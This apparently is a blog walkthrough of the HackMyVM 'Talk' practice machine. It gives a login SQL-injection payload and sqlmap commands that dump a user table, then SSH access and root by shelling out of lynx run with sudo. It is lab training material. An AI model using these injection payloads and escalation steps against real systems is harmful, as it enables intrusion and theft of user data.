---
layout: post
title:  "HackMyVM - Talk"
date:   2021-03-07 10:10:05 +0300
categories: [hackmyvm,walkthrough]
pin: true
tags: [sqli,sqlmap,guessing,lynx]
---
- You’ll find this vm in HackMyVM `https://hackmyvm.eu/machines/machine.php?vm=Talk`

- Difficulty : Easy

## Port scan
{% highlight sh %}
  ┌──(alienum㉿kali)-[~]
  └─$ nmap 10.0.2.179   
  PORT   STATE SERVICE
  22/tcp open  ssh
  80/tcp open  http
{% endhighlight %}


## Login sql injection

- Username : `admin' or '1'='1'-- -`
- Password : `whateveryouwant`

## POST request sql injection ( send_message.php )

- r.txt

{% highlight txt %}
POST /send_message.php HTTP/1.1
Host: 10.0.2.179
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 19
Origin: http://10.0.2.179
Connection: close
Referer: http://10.0.2.179/home.php
Cookie: PHPSESSID=m7ffe2uiavtmhbkmupt24lh2qi

msg=hi&id=1
{% endhighlight %}

## SQLMap

- sqlmap -r r.txt --tables
- sqlmap -r r.txt --tables -D chat
- sqlmap -r r.txt --dump -D chat -T user

__Result__

```
Database: chat
Table: user
[5 entries]
+--------+-----------------+-------------+-----------------+----------+-----------+
| userid | email           | phone       | password        | username | your_name |
+--------+-----------------+-------------+-----------------+----------+-----------+
| 5      | david@david.com | 11          | adrian*******   | david    | david     |
| 4      | jerry@jerry.com | 111         | thatsm********* | jerry    | jerry     |
| 2      | nona@nona.com   | 1111        | myfriend***     | nona     | nona      |
| 1      | pao@yahoo.com   | 09123123123 | pao             | pao      | PaoPao    |
| 3      | tina@tina.com   | 11111       | david********   | tina     | tina      |
+--------+-----------------+-------------+-----------------+----------+-----------+
```


## Reading the chat

```
February 18, 2021 4:48:pm
nona: where is adrian?

February 18, 2021 4:49:pm
tina: he got hacked!

February 18, 2021 4:49:pm
jerry: all of us....

February 18, 2021 4:50:pm
nona: :(
```

- The hacker shuffle the passwords

__Correct username & password matching__

`nona` : `thatsm*********`

## SSH as nona

```
┌──(alienum㉿kali)-[~]
└─$ ssh nona@10.0.2.179                                    
nona@10.0.2.179's password: thatsm*********
nona@talk:~$ ls
flag.sh  user.txt
nona@talk:~$
```

## Root

- sudo -l

```
nona@talk:~$ sudo -l
Matching Defaults entries for nona on talk:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User nona may run the following commands on talk:
    (ALL : ALL) NOPASSWD: /usr/bin/lynx
```

- Execute it

```
nona@talk:~$ sudo -u root /usr/bin/lynx
Spawning your default shell.  Use 'exit' to return to Lynx.

Press : SHIFT + 1

root@talk:/home/nona# cd
root@talk:~# ls
flag.sh  root.txt
root@talk:~#
```
